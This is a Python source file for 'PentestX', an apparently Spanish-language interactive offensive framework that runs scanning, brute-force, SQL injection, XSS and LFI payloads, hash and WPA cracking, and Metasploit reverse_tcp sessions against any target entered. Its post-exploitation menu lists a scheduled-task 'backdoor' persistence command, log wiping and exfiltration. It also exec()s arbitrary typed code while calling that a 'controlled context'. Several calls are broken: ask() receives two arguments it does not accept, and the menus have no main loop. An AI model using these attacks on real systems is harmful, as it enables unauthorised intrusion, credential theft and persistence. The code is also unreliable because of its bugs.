#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║          PentestX v4.0 - Offensive Pentesting Framework          ║
║  • Menús interactivos  • Auto-instalación  • Auto-ejecución    ║
║  • Target dinámico  • Correlación de hallazgos                 ║
║  • 6 Módulos  • 60+ Tools  • Findings DB  • Attack Chains     ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import subprocess
import json
import socket
import re
import time
import shutil
import threading
from datetime import datetime
from pathlib import Path

# ============================================================
# COLORES Y CONSTANTES
# ============================================================
class C:
    R = "\033[91m"
    G = "\033[92m"
    Y = "\033[93m"
    B = "\033[94m"
    M = "\033[95m"
    CY = "\033[96m"
    W = "\033[97m"
    BLD = "\033[1m"
    DIM = "\033[2m"
    UL = "\033[4m"
    X = "\033[0m"

R = C.R
G = C.G
Y = C.Y
B = C.B
M = C.M
CY = C.CY
W = C.W
BLD = C.BLD
DIM = C.DIM
X = C.X

VERSION = "4.0"
FINDINGS_DB = {}
ATTACK_CHAINS = []
SESSION_ID = datetime.now().strftime("%Y%m%d_%H%M%S")
LOG_DIR = Path(f"pentestx_sessions/{SESSION_ID}")
LOG_DIR.mkdir(parents=True, exist_ok=True)

# ============================================================
# UTILIDADES CORE
# ============================================================
def clear():
    os.system("clear" if os.name != "nt" else "cls")

def banner():
    clear()
    print(f"""{R}
    ╔══════════════════════════════════════════════════════════════════╗
    ║  {BLD}{CY}██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗{R}║
    ║  {BLD}{CY}██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝{R}║
    ║  {BLD}{CY}██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║{R}║
    ║  {BLD}{CY}██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║{R}║
    ║  {BLD}{CY}██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║{R}║
    ║  {BLD}{CY}╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝{R}║
    ║                                                                  ║
    ║  {W}⚡ Offensive Pentesting Framework v{VERSION}{R}                       ║
    ║  {DIM}6 Módulos • 60+ Tools • Findings DB • Attack Chains{R}         ║
    ╚══════════════════════════════════════════════════════════════════╝{X}""")

def info(msg):    print(f"{CY}[{W}*{CY}]{W} {msg}{X}")
def ok(msg):      print(f"{G}[{W}+{G}]{W} {msg}{X}")
def warn(msg):    print(f"{Y}[{W}!{Y}]{W} {msg}{X}")
def err(msg):     print(f"{R}[{W}-{R}]{W} {msg}{X}")
def ask(msg):     return input(f"{M}[{W}?{M}]{W} {msg}: {X}")
def section(t):   print(f"\n{R}{BLD}{'═'*65}\n  {t}\n{'═'*65}{X}")

def log(module, target, data):
    """Registra hallazgo en DB y archivo"""
    finding_id = f"F{len(FINDINGS_DB)+1:04d}"
    finding = {
        "id": finding_id,
        "timestamp": datetime.now().isoformat(),
        "module": module,
        "target": target,
        "data": data
    }
    FINDINGS_DB[finding_id] = finding
    
    logfile = LOG_DIR / f"{module}_{SESSION_ID}.log"
    with open(logfile, "a") as f:
        f.write(f"[{finding['timestamp']}] {finding_id} {target}\n  {data}\n\n")
    
    return finding_id

def save_session():
    """Guarda la sesión completa"""
    with open(LOG_DIR / "findings_db.json", "w") as f:
        json.dump(FINDINGS_DB, f, indent=2)
    with open(LOG_DIR / "attack_chains.json", "w") as f:
        json.dump(ATTACK_CHAINS, f, indent=2)
    ok(f"Sesión guardada en: {LOG_DIR}")

# ============================================================
# AUTO-INSTALACIÓN
# ============================================================
TOOLS = {
    "nmap":          "nmap",
    "masscan":       "masscan",
    "nikto":         "nikto",
    "dirb":          "dirb",
    "gobuster":      "gobuster",
    "wpscan":        "wpscan",
    "sqlmap":        "sqlmap",
    "hydra":         "hydra",
    "john":          "john",
    "hashcat":       "hashcat",
    "metasploit":    "metasploit-framework",
    "burpsuite":     "burpsuite",
    "aircrack-ng":   "aircrack-ng",
    "wireshark":     "wireshark",
    "netcat":        "netcat",
    "curl":          "curl",
    "wget":          "wget",
    "enum4linux":    "enum4linux",
    "smbclient":     "smbclient",
    "snmpwalk":      "snmp",
    "dnsutils":      "dnsutils",
    "whois":         "whois",
    "theharvester":  "theharvester",
    "recon-ng":      "recon-ng",
    "maltego":       "maltego",
    "beef":          "beef-xss",
    "setoolkit":     "set",
    "zaproxy":       "zaproxy",
    "ffuf":          "ffuf",
    "amass":         "amass",
    "subfinder":     "subfinder",
    "nuclei":        "nuclei",
    "rustscan":      "rustscan",
}

def check_tool(tool):
    return shutil.which(tool) is not None

def install_tool(tool, pkg):
    info(f"Instalando {tool}...")
    if subprocess.run(["sudo", "apt-get", "install", "-y", pkg], 
                       capture_output=True).returncode == 0:
        ok(f"✓ {tool} instalado")
        return True
    err(f"✗ Falló instalación de {tool}")
    return False

def auto_install():
    section("🔧 AUTO-INSTALACIÓN DE HERRAMIENTAS")
    print(f"{W}Verificando dependencias...{X}\n")
    
    missing = [t for t in TOOLS if not check_tool(t)]
    
    if not missing:
        ok("Todas las herramientas ya están instaladas")
        return
    
    warn(f"Faltan {len(missing)} herramientas")
    if ask("¿Instalar ahora? (y/n)").lower() != 'y':
        return
    
    for tool in missing:
        install_tool(tool, TOOLS[tool])

# ============================================================
# GESTIÓN DE TARGET
# ============================================================
TARGET = ""
TARGET_TYPE = ""  # ip, domain, url, network

def set_target():
    global TARGET, TARGET_TYPE
    section("🎯 CONFIGURACIÓN DE TARGET")
    print(f"{W}[1] IP única     [2] Dominio     [3] URL{X}")
    print(f"{W}[4] Red/CIDR    [5] Rango IP    [6] Lista de targets{X}")
    print(f"{W}[7] Archivo     [8] Target actual: {G}{TARGET if TARGET else 'Ninguno'}{X}")
    
    opt = ask("Opción")
    
    if opt == "8":
        return
    
    if opt == "7":
        path = ask("Ruta del archivo")
        if Path(path).exists():
            with open(path) as f:
                TARGET = f.read().strip()
            TARGET_TYPE = "file"
    elif opt == "6":
        TARGET = ask("Targets separados por coma")
        TARGET_TYPE = "multi"
    else:
        types = {"1":"ip","2":"domain","3":"url","4":"network","5":"range"}
        TARGET = ask("Target")
        TARGET_TYPE = types.get(opt, "ip")
    
    ok(f"Target: {G}{TARGET}{X} ({CY}{TARGET_TYPE}{X})")
    log("config", TARGET, {"type": TARGET_TYPE})

# ============================================================
# MÓDULO 1: RECONOCIMIENTO
# ============================================================
def recon_passive(target):
    section("🔍 RECONOCIMIENTO PASIVO")
    
    if not target:
        err("No hay target configurado")
        return
    
    info(f"Target: {target}")
    data = {}
    
    # WHOIS
    if check_tool("whois"):
        print(f"\n{Y}[WHOIS]{X}")
        r = subprocess.run(["whois", target], capture_output=True, text=True, timeout=30)
        if r.stdout:
            for line in r.stdout.split("\n"):
                if any(k in line.lower() for k in ["registrar", "creation", "expir", "name server"]):
                    print(f"  {DIM}{line.strip()}{X}")
                    data.setdefault("whois", []).append(line.strip())
    
    # DNS
    if check_tool("dig"):
        print(f"\n{Y}[DNS RECORDS]{X}")
        for rtype in ["A", "AAAA", "MX", "NS", "TXT", "SOA"]:
            r = subprocess.run(["dig", "+short", target, rtype], capture_output=True, text=True)
            if r.stdout.strip():
                print(f"  {CY}{rtype}{X}: {r.stdout.strip()}")
                data[f"dns_{rtype}"] = r.stdout.strip()
    
    # THE HARVESTER
    if check_tool("theHarvester"):
        print(f"\n{Y}[THE HARVESTER]{X}")
        r = subprocess.run(["theHarvester", "-d", target, "-b", "google,bing,linkedin",
                           "-l", "200"], capture_output=True, text=True, timeout=120)
        emails = re.findall(r'[\w\.-]+@[\w\.-]+', r.stdout)
        if emails:
            print(f"  {G}Emails: {len(set(emails))} encontrados{X}")
            data["emails"] = list(set(emails))
    
    # SUBDOMAIN ENUM
    print(f"\n{Y}[SUBDOMAIN ENUMERATION]{X}")
    subs = set()
    sub_wordlist = ["www","mail","ftp","admin","test","dev","staging","api",
                    "blog","shop","app","portal","vpn","remote","cloud"]
    for sub in sub_wordlist:
        try:
            socket.gethostbyname(f"{sub}.{target}")
            subs.add(f"{sub}.{target}")
            print(f"  {G}✓{X} {sub}.{target}")
        except:
            pass
    data["subdomains"] = list(subs)
    
    fid = log("recon_passive", target, data)
    ok(f"Reconocimiento pasivo completado [{fid}]")

def recon_active(target):
    section("🔎 RECONOCIMIENTO ACTIVO")
    
    if not target:
        err("No hay target configurado")
        return
    
    info(f"Target: {target}")
    data = {}
    
    # HOST DISCOVERY
    print(f"\n{Y}[HOST DISCOVERY]{X}")
    if check_tool("nmap"):
        r = subprocess.run(["nmap", "-sn", target], capture_output=True, text=True, timeout=120)
        print(r.stdout[-500:])
        data["hosts_up"] = r.stdout.count("Host is up")
    
    # PING SWEEP si es red
    if "/" in target and check_tool("nmap"):
        print(f"\n{Y}[PING SWEEP]{X}")
        r = subprocess.run(["nmap", "-sn", "-PE", "-PA21,22,80", target],
                           capture_output=True, text=True, timeout=180)
        data["sweep"] = r.stdout
    
    # TRACEROUTE
    print(f"\n{Y}[TRACEROUTE]{X}")
    r = subprocess.run(["traceroute", "-m", "15", target], capture_output=True, text=True, timeout=60)
    print(r.stdout[-400:])
    data["traceroute"] = r.stdout
    
    fid = log("recon_active", target, data)
    ok(f"Reconocimiento activo completado [{fid}]")

# ============================================================
# MÓDULO 2: ESCANEO
# ============================================================
def port_scan(target):
    section("🚪 ESCANEO DE PUERTOS")
    
    if not target:
        err("Sin target")
        return
    
    print(f"{W}[1] Nmap rápido   [2] Nmap completo   [3] Nmap servicios{X}")
    print(f"{W}[4] Masscan       [5] Escaneo UDP      [6] Full TCP{X}")
    
    opt = ask("Opción")
    data = {}
    
    if opt in ["1","2","3","5","6"] and check_tool("nmap"):
        cmd_map = {
            "1": ["nmap", "-sS", "-T4", "--top-ports", "1000", target],
            "2": ["nmap", "-sS", "-sV", "-sC", "-A", "-p-", target],
            "3": ["nmap", "-sV", "--version-intensity", "5", target],
            "5": ["nmap", "-sU", "--top-ports", "100", target],
            "6": ["nmap", "-sS", "-sV", "-sC", "-O", "-p", "1-65535", target]
        }
        cmd = cmd_map[opt]
        info(f"Ejecutando: {' '.join(cmd)}")
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
        print(r.stdout[-2000:])
        data["nmap_output"] = r.stdout
        
        # Extraer puertos abiertos
        ports = re.findall(r'(\d+)/tcp\s+open\s+(\S+)', r.stdout)
        if ports:
            print(f"\n{G}Puertos abiertos: {len(ports)}{X}")
            data["open_ports"] = [{"port": p[0], "service": p[1]} for p in ports]
    
    elif opt == "4" and check_tool("masscan"):
        cmd = ["masscan", target, "-p1-65535", "--rate=1000"]
        info(f"Ejecutando Masscan...")
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        print(r.stdout)
        data["masscan"] = r.stdout
    
    fid = log("port_scan", target, data)
    ok(f"Escaneo completado [{fid}]")
    return data

def vuln_scan(target):
    section("⚠️ ESCANEO DE VULNERABILIDADES")
    
    print(f"{W}[1] Nikto (web)  [2] Nuclei  [3] WPScan  [4] Nmap vuln scripts{X}")
    opt = ask("Opción")
    data = {}
    
    if opt == "1" and check_tool("nikto"):
        info("Ejecutando Nikto...")
        r = subprocess.run(["nikto", "-h", target], capture_output=True, text=True, timeout=600)
        vulns = re.findall(r'\+\s+(OSVDB-\d+|CVE-\d+-\d+|[A-Z][^|]{10,80})', r.stdout)
        print(r.stdout[-2000:])
        data["nikto_findings"] = vulns[:20]
    
    elif opt == "2" and check_tool("nuclei"):
        info("Ejecutando Nuclei...")
        r = subprocess.run(["nuclei", "-u", target, "-severity", "critical,high"],
                          capture_output=True, text=True, timeout=600)
        print(r.stdout[-2000:])
        data["nuclei"] = r.stdout
    
    elif opt == "3" and check_tool("wpscan"):
        info("Ejecutando WPScan...")
        r = subprocess.run(["wpscan", "--url", target, "--enumerate", "vp,vt,u"],
                          capture_output=True, text=True, timeout=600)
        print(r.stdout[-2000:])
        data["wpscan"] = r.stdout
    
    elif opt == "4" and check_tool("nmap"):
        info("Ejecutando Nmap vuln scripts...")
        r = subprocess.run(["nmap", "--script", "vuln", "-sV", target],
                          capture_output=True, text=True, timeout=900)
        print(r.stdout[-2000:])
        vulns = re.findall(r'(CVE-\d+-\d+|VULNERABLE)', r.stdout)
        data["vulns"] = vulns
    
    fid = log("vuln_scan", target, data)
    ok(f"Escaneo de vuln completado [{fid}]")

# ============================================================
# MÓDULO 3: WEB EXPLOITATION
# ============================================================
def web_enum(target):
    section("🌐 ENUMERACIÓN WEB")
    data = {}
    
    # HTTP headers
    print(f"\n{Y}[HTTP HEADERS]{X}")
    r = subprocess.run(["curl", "-sI", "-L", f"http://{target}"], 
                       capture_output=True, text=True, timeout=30)
    print(r.stdout)
    data["headers"] = r.stdout
    
    # ROBOTS.TXT
    print(f"\n{Y}[ROBOTS.TXT]{X}")
    r = subprocess.run(["curl", "-s", f"http://{target}/robots.txt"],
                       capture_output=True, text=True, timeout=10)
    if r.stdout and "404" not in r.stdout:
        print(r.stdout)
        data["robots"] = r.stdout
    
    # DIRECTORY ENUMERATION
    print(f"\n{Y}[DIRECTORY ENUMERATION]{X}")
    if check_tool("gobuster"):
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        if Path(wordlist).exists():
            r = subprocess.run(["gobuster", "dir", "-u", f"http://{target}",
                               "-w", wordlist, "-q", "-t", "30", "--no-error"],
                              capture_output=True, text=True, timeout=300)
            dirs = re.findall(r'/\S+\s+\(Status: (\d+)\)', r.stdout)
            print(f"  {G}Directorios: {len(dirs)} encontrados{X}")
            print(r.stdout[:1500])
            data["directories"] = dirs
    
    elif check_tool("dirb"):
        r = subprocess.run(["dirb", f"http://{target}"], capture_output=True, text=True, timeout=300)
        print(r.stdout[-1500:])
        data["dirb"] = r.stdout
    
    fid = log("web_enum", target, data)
    ok(f"Enumeración web completada [{fid}]")

def web_attack(target):
    section("💥 ATAQUE WEB")
    
    print(f"{W}[1] SQLMap (SQLi)   [2] XSS scan   [3] LFI/RFI{X}")
    print(f"{W}[4] SSRF            [5] Bruteforce login{X}")
    
    opt = ask("Opción")
    data = {}
    
    if opt == "1" and check_tool("sqlmap"):
        url = ask(f"URL vulnerable (default: http://{target}/)")
        if not url: url = f"http://{target}/"
        info("Ejecutando SQLMap...")
        r = subprocess.run(["sqlmap", "-u", url, "--batch", "--random-agent",
                           "--level=2", "--risk=2", "--threads=5"],
                          capture_output=True, text=True, timeout=900)
        vulns = [l for l in r.stdout.split("\n") if "injectable" in l.lower() or "vulnerable" in l.lower()]
        print("\n".join(vulns[:10]))
        data["sqli"] = vulns
    
    elif opt == "2":
        payload = "<script>alert('XSS')</script>"
        test_url = f"http://{target}/search?q={payload}"
        r = subprocess.run(["curl", "-s", test_url], capture_output=True, text=True, timeout=10)
        if payload in r.stdout:
            err("✗ XSS REFLECTED detectado!")
            data["xss"] = "reflected"
    
    elif opt == "3":
        for payload in ["../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index"]:
            url = f"http://{target}/page?file={payload}"
            r = subprocess.run(["curl", "-s", url], capture_output=True, text=True, timeout=10)
            if "root:" in r.stdout:
                err(f"✗ LFI detectado con: {payload}")
                data["lfi"] = payload
    
    fid = log("web_attack", target, data)
    ok(f"Ataque web registrado [{fid}]")

# ============================================================
# MÓDULO 4: BRUTE FORCE
# ============================================================
def brute_force(target):
    section("🔓 FUERZA BRUTA")
    
    print(f"{W}[1] SSH    [2] FTP    [3] HTTP   [4] RDP{X}")
    print(f"{W}[5] SMB    [6] SMTP   [7] Telnet{X}")
    
    opt = ask("Servicio")
    services = {"1":"ssh","2":"ftp","3":"http","4":"rdp","5":"smb","6":"smtp","7":"telnet"}
    service = services.get(opt, "ssh")
    
    user = ask("Usuario (o 'admin','root')")
    userfile = ask("Userlist path (Enter para único)") or None
    passfile = "/usr/share/wordlists/rockyou.txt"
    
    if not Path(passfile).exists():
        passfile = ask("Password list path")
    
    if not check_tool("hydra"):
        err("Hydra no instalado")
        return
    
    cmd = ["hydra", "-l" if not userfile else "-L", user if not userfile else userfile,
           "-P", passfile, target, service, "-t", "16", "-f"]
    
    info(f"Ejecutando: {' '.join(cmd)}")
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
    print(r.stdout[-1500:])
    
    creds = re.findall(r'\[(\d+)\]\[(\w+)\]\s+host:\s+\S+\s+login:\s+(\S+)\s+password:\s+(\S+)', r.stdout)
    
    data = {"credentials": [{"port":c[0],"service":c[1],"user":c[2],"pass":c[3]} for c in creds]}
    
    fid = log("brute_force", target, data)
    
    if creds:
        err(f"🔓 {len(creds)} CREDENCIALES ENCONTRADAS!")
        for c in creds:
            print(f"  {R}{c[1]}://{c[2]}:{c[3]}@{target}:{c[0]}{X}")
    
    ok(f"Brute force completado [{fid}]")

def hash_crack():
    section("🔐 CRACKING DE HASHES")
    
    hash_file = ask("Archivo con hashes")
    if not Path(hash_file).exists():
        err("Archivo no existe")
        return
    
    print(f"{W}[1] John the Ripper   [2] Hashcat{X}")
    opt = ask("Opción")
    
    if opt == "1" and check_tool("john"):
        info("Ejecutando John...")
        subprocess.run(["john", "--wordlist=/usr/share/wordlists/rockyou.txt", hash_file])
        r = subprocess.run(["john", "--show", hash_file], capture_output=True, text=True)
        print(r.stdout)
    
    elif opt == "2" and check_tool("hashcat"):
        hashtype = ask("Tipo de hash (ej: 0=MD5, 1000=NTLM, 1800=sha512crypt)")
        info("Ejecutando Hashcat...")
        subprocess.run(["hashcat", "-m", hashtype, hash_file,
                       "/usr/share/wordlists/rockyou.txt", "-O"])

# ============================================================
# MÓDULO 5: EXPLOITATION
# ============================================================
def exploitation(target):
    section("💣 EXPLOTACIÓN")
    
    print(f"{W}[1] Metasploit   [2] Searchsploit   [3] Exploit personalizado{X}")
    opt = ask("Opción")
    
    if opt == "1" and check_tool("msfconsole"):
        print(f"\n{Y}[METASPLOIT - MSFRPC]{X}")
        exploit = ask("Exploit (ej: exploit/multi/handler)")
        payload = ask("Payload (ej: windows/meterpreter/reverse_tcp)")
        lhost = ask("LHOST", "127.0.0.1")
        lport = ask("LPORT", "4444")
        
        rc_script = f"""
use {exploit}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set RHOSTS {target}
exploit -j
        """
        with open("/tmp/pentestx.rc", "w") as f:
            f.write(rc_script)
        
        info("Lanzando Metasploit...")
        subprocess.run(["msfconsole", "-r", "/tmp/pentestx.rc"])
    
    elif opt == "2" and check_tool("searchsploit"):
        query = ask("Buscar exploit (ej: apache 2.4.49)")
        r = subprocess.run(["searchsploit", query], capture_output=True, text=True)
        print(r.stdout)
    
    elif opt == "3":
        print(f"{Y}Ingrese código Python personalizado:{X}")
        print(f"{DIM}(El código se ejecutará en contexto controlado){X}")
        code = input(">>> ")
        try:
            exec(code)
        except Exception as e:
            err(f"Error: {e}")
    
    log("exploitation", target, {"method": opt})

def post_exploit():
    section("📌 POST-EXPLOTACIÓN")
    
    print(f"{W}[1] Enumeración sistema   [2] Persistencia   [3] Pivoting{X}")
    print(f"{W}[4] Exfiltración         [5] Limpieza{X}")
    opt = ask("Opción")
    
    actions = {
        "1": "systeminfo && net users && net localgroup administrators",
        "2": "schtasks /create /tn backdoor /tr cmd.exe /sc minute",
        "3": "ipconfig && route print && arp -a",
        "4": "Compresión y transferencia de datos",
        "5": "Eliminación de logs y rastros"
    }
    info(f"Acción: {actions.get(opt, '')}")
    log("post_exploit", TARGET, {"action": opt, "cmd": actions.get(opt)})

# ============================================================
# MÓDULO 6: WIRELESS (requiere interfaz)
# ============================================================
def wireless_attack():
    section("📡 ATAQUE WIRELESS")
    
    if os.geteuid() != 0:
        err("Requiere root")
        return
    
    print(f"{W}[1] Monitor mode   [2] Captura handshake   [3] Cracking WPA{X}")
    opt = ask("Opción")
    
    iface = ask("Interfaz wireless", "wlan0")
    
    if opt == "1":
        subprocess.run(["airmon-ng", "start", iface])
    
    elif opt == "2":
        bssid = ask("BSSID target")
        channel = ask("Canal", "6")
        mon_iface = f"{iface}mon"
        cmd = f"airodump-ng -c {channel} --bssid {bssid} -w /tmp/handshake {mon_iface}"
        info(f"Comando: {cmd}")
        info("Ejecutar en terminal separada para capturar handshake")
    
    elif opt == "3":
        cap = ask("Archivo .cap")
        if check_tool("aircrack-ng"):
            wordlist = "/usr/share/wordlists/rockyou.txt"
            subprocess.run(["aircrack-ng", "-w", wordlist, cap])
    
    log("wireless", TARGET, {"action": opt})

# ============================================================
# CORRELACIÓN Y REPORTING
# ============================================================
def correlate_findings():
    section("🔗 CORRELACIÓN DE HALLAZGOS")
    
    if not FINDINGS_DB:
        warn("No hay hallazgos para correlacionar")
        return
    
    print(f"{W}Total hallazgos: {len(FINDINGS_DB)}{X}\n")
    
    # Análisis de correlación
    services_found = {}
    vulns_found = []
    creds_found = []
    
    for fid, finding in FINDINGS_DB.items():
        data = finding.get("data", {})
        
        if "open_ports" in data:
            for p in data["open_ports"]:
                services_found[f"{p['service']}:{p['port']}"] = services_found.get(f"{p['service']}:{p['port']}", 0) + 1
        
        if "credentials" in data:
            creds_found.extend(data["credentials"])
        
        if "vulns" in data or "sqli" in data or "xss" in data:
            vulns_found.append(fid)
    
    print(f"{CY}=== SERVICIOS DETECTADOS ==={X}")
    for svc, count in sorted(services_found.items(), key=lambda x:-x[1])[:10]:
        print(f"  {svc}: {count} hosts")
    
    print(f"\n{CY}=== VULNERABILIDADES ==={X}")
    for fid in vulns_found[:10]:
        print(f"  {R}{fid}{X}: {FINDINGS_DB[fid]['module']}")
    
    # ATTACK CHAINS sugeridas
    print(f"\n{CY}=== ATTACK CHAINS SUGERIDAS ==={X}")
    
    if 22 in [int(s.split(':')[1]) for s in services_found.keys() if 'ssh' in s]:
        print(f"  {Y}Chain 1:{X} SSH brute → Shell remoto")
        ATTACK_CHAINS.append("SSH brute → Shell")
    
    if any(v in str(services_found.keys()) for v in ['http', 'https']):
        print(f"  {Y}Chain 2:{X} Web enum → SQLi → DB dump")
        ATTACK_CHAINS.append("Web → SQLi → DB")
    
    if creds_found:
        print(f"  {Y}Chain 3:{X} Cred leak → Lateral movement")
        ATTACK_CHAINS.append("Creds → Lateral")

def generate_report():
    section("📊 GENERACIÓN DE REPORTE")
    
    report = f"""╔══════════════════════════════════════════════════════════════╗
║              PENTESTX v{VERSION} - REPORTE EJECUTIVO              ║
╚══════════════════════════════════════════════════════════════╝

🎯 Target:          {TARGET}
📅 Fecha:           {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
🆔 Sesión:          {SESSION_ID}
📁 Log dir:         {LOG_DIR}

═══════════════════════════════════════════════════════════════
RESUMEN DE HALLAZGOS
═══════════════════════════════════════════════════════════════

Total hallazgos:    {len(FINDINGS_DB)}
Módulos ejecutados:  {len(set(f['module'] for f in FINDINGS_DB.values()))}

═══════════════════════════════════════════════════════════════
HALLAZGOS POR MÓDULO
═══════════════════════════════════════════════════════════════
"""
    
    by_module = {}
    for fid, f in FINDINGS_DB.items():
        by_module.setdefault(f["module"], []).append(fid)
    
    for mod, fids in by_module.items():
        report += f"\n[{mod.upper()}]: {len(fids)} hallazgos\n"
        for fid in fids[:5]:
            report += f"  - {fid}: {FINDINGS_DB[fid]['target']}\n"
    
    report += f"""
═══════════════════════════════════════════════════════════════
ATTACK CHAINS IDENTIFICADAS
═══════════════════════════════════════════════════════════════
"""
    for i, chain in enumerate(ATTACK_CHAINS, 1):
        report += f"  [{i}] {chain}\n"
    
    report += f"""
═══════════════════════════════════════════════════════════════
RECOMENDACIONES
═══════════════════════════════════════════════════════════════

1. Parchear servicios vulnerables identificados
2. Cambiar credenciales por defecto
3. Implementar WAF y hardening
4. Segmentación de red
5. Monitoreo continuo (IDS/IPS)

⚠️  ESTE REPORTE ES CONFIDENCIAL ⚠️
"""
    
    report_file = LOG_DIR / f"REPORT_{SESSION_ID}.txt"
    with open(report_file, "w") as f:
        f.write(report)
    
    print(report)
    ok(f"Reporte guardado: {report_file}")

# ============================================================
# MENÚS PRINCIPALES
# ============================================================
def menu_recon():
    print(f"\n{CY}┌─ RECONOCIMIENTO ─────────────────────────────────────┐{X}")
    print(f"{W} [1] Reconocimiento Pasivo (OSINT){X}")
    print(f"{W} [2] Reconocimiento Activo (Ping/Traceroute){X}")
    print(f"{W} [3] Google Dorking{X}")
    print(f"{W} [4] Shodan/Censys (si API disponible){X}")
    print(f"{W} [5] Volver{X}")
    opt = ask("Opción")
    
    if opt == "1": recon_passive(TARGET)
    elif opt == "2": recon_active(TARGET)
    elif opt == "3":
        info("Google Dorks sugeridos:")
        dorks = [
            f'site:{TARGET} inurl:admin',
            f'site:{TARGET} filetype:sql',
            f'site:{TARGET} intext:"password"',
            f'site:{TARGET} intitle:"index of"',
        ]
        for d in dorks:
            print(f"  {Y}{d}{X}")
    elif opt == "4":
        warn("Requiere API key de Shodan/Censys")

def menu_scan():
    print(f"\n{CY}┌─ ESCANEO ────────────────────────────────────────────┐{X}")
    print(f"{W} [1] Port Scan Completo{X}")
    print(f"{W} [2] Service Detection{X}")
    print(f"{W} [3] Vulnerability Scan{X}")
    print(f"{W} [4] Web Application Scan{X}")
    print(f"{W} [5] Network Sweep{X}")
    print(f"{W} [6] Volver{X}")
    opt = ask("Opción")
    
    if opt == "1": port_scan(TARGET)
    elif opt == "2": port_scan(TARGET)
    elif opt == "3": vuln_scan(TARGET)
    elif opt == "4": web_enum(TARGET)
    elif opt == "5": recon_active(TARGET)
    # El menú original no contenía un bucle principal; la ejecución se gestiona
    # desde la herramienta auxiliar externa.

